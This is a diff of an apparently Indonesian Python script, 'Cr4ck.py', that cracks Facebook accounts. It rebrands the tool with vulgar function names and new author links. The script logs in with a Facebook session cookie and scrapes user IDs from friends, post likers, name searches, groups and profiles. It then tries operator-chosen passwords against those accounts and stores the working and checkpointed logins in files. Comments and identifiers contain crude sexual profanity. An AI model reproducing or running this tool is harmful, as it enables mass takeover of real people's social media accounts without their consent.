@@ -2,38 +2,38 @@
 # -*- coding: utf-8 -*-
 #Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-#Code by Syafii-XD
-#Created 05-07-2020
+#Code by Syafiiganteng 
+#Created 05-07-2022
 #My facebook (https://www.facebook.com/fikritampan305)
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
 from concurrent.futures import ThreadPoolExecutor
 
-def yuk():
+def croot():
     os.system("git pull")
-def clear():
+def ikeh_ikeh_kimochi():
     os.system("clear")
-def pii(s):
+def aahh(s):
     for c in s + '\n':
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(1./300)
-def legend():
+def kontol():
     time.sleep(0.3)
-    pii("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
+    aahh("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
      ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
      ██║     ██████╔╝███████║██║     █████╔╝ 
 \x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
      ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m────────────────────────────────────────────────────
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Mhd Syafii
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : mhd Syafii
 \x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Syafii-XD
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
-def daris():
+def jembut():
     print("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
      ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
      ██║     ██████╔╝███████║██║     █████╔╝ 
@@ -43,16 +43,16 @@ def daris():
 \x1b[1;94m────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : Mhd Syafii
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikrirampan305
 \x1b[1;94m────────────────────────────────────────────────────""")
 
-def syafiixd():
-    syafii=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
-    if syafii == "": 
+def yayanxd():
+    yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
+    if yayan == "": 
        os.system("python Cr4ck.py")
     else:
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
-def syafiiganteng():
+def moch_yayan():
     time.sleep(0.1)
     print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
     print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
@@ -63,8 +63,8 @@ def syafiiganteng():
     print("\x1b[1;94m────────────────────────────────────────────────────")
     time.sleep(0.1)
 
-    syafii=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
-    if syafii == "1" or syafii =="01":
+    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
+    if yayan == "1" or yayan =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
          id = []
@@ -78,10 +78,10 @@ def syafiiganteng():
              try:
                     cek = open("cookies").read()
              except FileNotFoundError:
-                   clear()
-                   daris()
-                   cek = input("\n\033[0;92m       [ \033[0;97mJangan Gunakan Akun Pribadi mu!!\033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
-                   print('\n\033[97m [\033[92m+\033[97m] \033[92mLoading.......')
+                   ikeh_ikeh_kimochi()
+                   kontol()
+                   cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
+                   print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
@@ -99,11 +99,10 @@ def syafiiganteng():
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
-                     return cek["cookie"];
-                     pii('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
-                     os.system("xdg-open https://www.facebook.com/fikritampan305")
+                     return cek["cookie"]
+                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open https://www.facebook.com/fikritampan305") 
+                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                   os.system('python Cr4ck.py')
@@ -156,7 +155,7 @@ def syafiiganteng():
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mSedang Mengambil ID... ",end="")
+                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -176,7 +175,7 @@ def syafiiganteng():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ',end="")
+                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
              return id
@@ -188,7 +187,7 @@ def syafiiganteng():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                   else:
                          id.append(user[1] + "|" + user[0].split("?")[0])
-                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ",end="")
+                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
              if "Lihat Hasil Selanjutnya" in str(search):
                   bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
              return id
@@ -200,7 +199,7 @@ def syafiiganteng():
                          id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ",end="")
+                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
              if "Lihat Selengkapnya" in str(grab):
                  grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
              return id
@@ -209,67 +208,64 @@ def syafiiganteng():
                    ses = requests.Session()
                    kukis = masuk()
                    kuki = {'cookie':kukis}
-                   pii('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
-                   os.system("xdg-open https://www.facebook.com/fikritampan305")
-                   clear()
-                   legend()
-                   pii('\033[1;97m [\033[1;94m☺☺\033[1;97m] Selamat Datang Bos Kuh')
-                   pii('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
-                   pii('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
-                   pii('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
-                   pii('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
-                   pii('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
-                   pii('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
-                   pii('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
-                   pii('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
+                   ikeh_ikeh_kimochi()
+                   kontol()
+                   aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
+                   aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
+                   aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
+                   aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
+                   aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
+                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
+                   aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
+                   aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                    print('\x1b[1;94m────────────────────────────────────────────────────')
-                   widiya = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
-                   if widiya =="":
+                   memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
+                   if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
-                         syafiixd()
-                   elif widiya == '0' or widiya =='00':
-                         pii("\n\033[1;92m Terima Kasih Sudah Menggunkan Tools Dari Saya.\n  Jangan Lupa Follow Akun Github Saya Ya..\n\n")
-                         os.system('xdg-open https://github.com/Syafii-XD')
+                         yayanxd()
+                   elif memek == '0' or memek =='00':
+                         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
+                         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
                          exit()                   	
-                   elif widiya == '7' or widiya =='07':
-                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mLoading... ")
-                         pii("\x1b[1;92m • 10")
-                         pii("\x1b[1;93m •• 20")
-                         pii("\x1b[1;94m ••• 30")
-                         pii("\x1b[1;95m •••• 40")
-                         pii("\x1b[1;96m ••••• 50")
-                         pii("\x1b[1;97m •••••• 60")
-                         pii("\x1b[1;92m ••••••• 70")
-                         pii("\x1b[1;91m •••••••• 80")
-                         pii("\x1b[1;96m ••••••••• 90")
-                         pii("\x1b[1;94m •••••••••• 100%")
+                   elif memek == '7' or memek =='07':
+                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
+                         aahh("\x1b[1;92m • 10")
+                         aahh("\x1b[1;93m •• 20")
+                         aahh("\x1b[1;94m ••• 30")
+                         aahh("\x1b[1;95m •••• 40")
+                         aahh("\x1b[1;96m ••••• 50")
+                         aahh("\x1b[1;97m •••••• 60")
+                         aahh("\x1b[1;92m ••••••• 70")
+                         aahh("\x1b[1;91m •••••••• 80")
+                         aahh("\x1b[1;96m ••••••••• 90")
+                         aahh("\x1b[1;94m •••••••••• 100%")
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
-                         syafiixd()
-                   elif widiya == '1' or widiya =='01':
+                         yayanxd()
+                   elif memek == '1' or memek =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
-                   elif widiya == '2' or widiya =='02':
+                   elif memek == '2' or memek =='02':
                          username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                          if username == "":
                                  exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
-                         elif 'www.facebook.com' in username:
-                                 username = username.replace('www.facebook.com','mbasic.facebook.com')
-                         elif 'www.facebook.com' in username:
-                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
+                         elif 'www.facebook' in username:
+                                 username = username.replace('www.facebook','mbasic.facebook')
+                         elif 'www.facebook' in username:
+                                 username = username.replace('m.facebook','mbasic.facebook.com')
                          username = fromlikes(username)
-                   elif widiya == '3' or widiya =='03':
+                   elif memek == '3' or memek =='03':
                          knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                          username = bysearch(mbasic.format('/search/people/?q='+knf))
                          if len(username) == 0:
                                  exit("\033[90m[\033[91m!\033[90m] No Name!")
-                   elif widiya == '4' or widiya =='04':
+                   elif memek == '4' or memek =='04':
                          print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                          if len(username) == 0:
                                  exit("\033[00m[\033[91m!\033[00m] Group ID None!")
-                   elif widiya == '5' or widiya =='05':
+                   elif memek == '5' or memek =='05':
                          knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                          if knf.isdigit():
                                  user = "/profile.php?id=" + knf
@@ -280,7 +276,7 @@ def syafiiganteng():
                                  username = getid(mbasic.format(user))
                          except TypeError:
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
-                   elif widiya == '6' or widiya =='06':
+                   elif memek == '6' or memek =='06':
                          try:
                                  file1 = open("cp.txt").read()
                                  file2 = open("ok.txt").read()
@@ -305,19 +301,19 @@ def syafiiganteng():
                                  exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                    else:
                          print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
-                         syafiixd()
+                         yayanxd()
                    print()
-                   clear()
-                   daris()
+                   ikeh_ikeh_kimochi()
+                   jembut()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                    print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
-                   pii('\x1b[1;94m────────────────────────────────────────────────────\n')
-                   clear()
-                   daris()
+                   aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
+                   ikeh_ikeh_kimochi()
+                   jembut()
                    print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                    print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
@@ -348,29 +344,29 @@ def syafiiganteng():
                except requests.exceptions.ConnectionError:
                        exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")
 
-    elif syafii == "2" or syafii =="02":
+    elif yayan == "2" or yayan =="02":
          os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
-         syafiixd()
-    elif syafii == "3" or syafii =="03":
+         yayanxd()
+    elif yayan == "3" or yayan =="03":
          os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
-         syafiixd()
-    elif syafii == "4" or syafii =="04":
+         yayanxd()
+    elif yayan == "4" or yayan =="04":
          os.system('xdg-open https://www.facebook.com/groups/3877586212335618')
-         syafiixd
-    elif syafii == "5" or syafii =="05":
+         yayanxd()
+    elif yayan == "5" or yayan =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
          os.system("git pull")
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
-         syafiixd()
-    elif syafii == "0" or syafii =="00":
-         pii("\n\033[1;92m Terima Kasih Sudah Menggunakan Tools Dari Saya.\n  Jangan Lupa Follow Akun Github Saya\n\n")
-         os.system('xdg-open https://github.com/Syafii-XD')
+         yayanxd()
+    elif yayan == "0" or yayan =="00":
+         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
+         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
          exit()                   	
 
 if __name__=="__main__":
-     clear()
-     yuk()
-     clear()
-     legend()
-     syafiiganteng()
-     syafiixd()
+     ikeh_ikeh_kimochi()
+     croot()
+     ikeh_ikeh_kimochi()
+     kontol()
+     moch_yayan()
+     yayanxd()
